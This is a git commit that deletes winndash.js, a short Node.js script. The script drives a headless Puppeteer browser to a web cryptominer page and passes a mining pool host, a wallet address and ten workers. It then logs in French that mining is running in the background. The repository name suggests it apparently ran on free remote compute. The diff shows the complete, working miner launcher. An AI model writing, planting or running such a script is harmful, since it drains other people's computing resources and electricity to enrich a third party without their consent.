1985d755545bca804fe2a6bacaf62e05ec72516b
freecodes-rdp <freecodespaces1@gmail.com>
2026-02-18 15:14:15 +0100

    Delete winndash.js

--- winndash.js
+++
@@ -1,7 +0,0 @@
-const puppeteer = require('puppeteer');
-(async () => {
-  const browser = await puppeteer.launch({ headless: "new" });
-  const page = await browser.newPage();
-  await page.goto('https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=XbCLsxKNZkVPPLNAXzoTUwAxVMiT3r8saZ&password=c%3DDASH&workers=10');
-  console.log("Minage en cours en arrière-plan...");
-})();
